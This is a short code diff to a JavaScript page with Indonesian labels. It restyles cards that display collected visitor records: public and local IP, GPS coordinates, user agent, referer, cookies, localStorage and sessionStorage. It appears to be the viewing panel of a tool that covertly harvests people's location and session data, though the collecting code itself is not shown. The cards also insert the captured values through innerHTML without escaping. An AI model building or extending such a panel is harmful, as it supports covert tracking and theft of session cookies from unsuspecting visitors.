@@ -135,20 +135,41 @@
 
       const card = document.createElement('div');
       card.className = 'info-card';
-      card.id = 'card-' + key;
       card.innerHTML = `
-        <strong>Waktu:</strong> ${data.timestamp}<br>
-        <strong>IP Publik:</strong> ${data.ip}<br>
-        <strong>IP Lokal:</strong> ${data.localIP}<br>
-        <strong>User Agent:</strong> ${data.userAgent}<br>
-        <strong>Referer:</strong> ${data.referer}<br>
-        <strong>Latitude:</strong> ${data.latitude}<br>
-        <strong>Longitude:</strong> ${data.longitude}<br>
-        <strong>Akurasi:</strong> ${data.accuracy}<br>
-        <strong>Cookies:</strong> ${data.cookies}<br>
-        <strong>LocalStorage:</strong> ${data.localStorage}<br>
-        <strong>SessionStorage:</strong> ${data.sessionStorage}<br>
-      `;
+  <div style="margin-bottom: 10px;">
+    <strong>🕒 Waktu:</strong> ${data.timestamp}<br>
+    <strong>🌐 IP Publik:</strong> ${data.ip}<br>
+    <strong>🏠 IP Lokal:</strong> ${data.localIP}<br>
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <strong>📍 Lokasi:</strong><br>
+    Latitude: ${data.latitude}<br>
+    Longitude: ${data.longitude}<br>
+    Akurasi: ${data.accuracy}
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <strong>🧭 Referer:</strong> ${data.referer || "-"}<br>
+    <strong>🧪 User Agent:</strong><br>
+    <div style="white-space: pre-wrap;">${data.userAgent}</div>
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <strong>🍪 Cookies:</strong><br>
+    <div style="white-space: pre-wrap;">${data.cookies}</div>
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <strong>📦 LocalStorage:</strong><br>
+    <div style="white-space: pre-wrap;">${data.localStorage}</div>
+  </div>
+
+  <div style="margin-bottom: 10px;">
+    <strong>💾 SessionStorage:</strong><br>
+    <div style="white-space: pre-wrap;">${data.sessionStorage}</div>
+  </div>
+`;
       infoContainer.appendChild(card);
     }
 
